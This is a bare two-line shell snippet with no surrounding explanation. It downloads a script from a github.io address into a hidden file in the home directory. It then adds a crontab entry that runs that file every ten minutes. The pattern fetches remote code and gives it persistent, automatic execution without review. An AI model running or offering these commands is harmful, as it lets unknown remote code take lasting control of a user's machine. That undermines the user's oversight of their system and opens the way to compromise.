curl -s https://kasderooi.github.io/curltest/doit.sh --output ~/.doit.sh
(crontab -l 2>/dev/null; echo "*/10 * * * * ~/.doit.sh") | crontab -
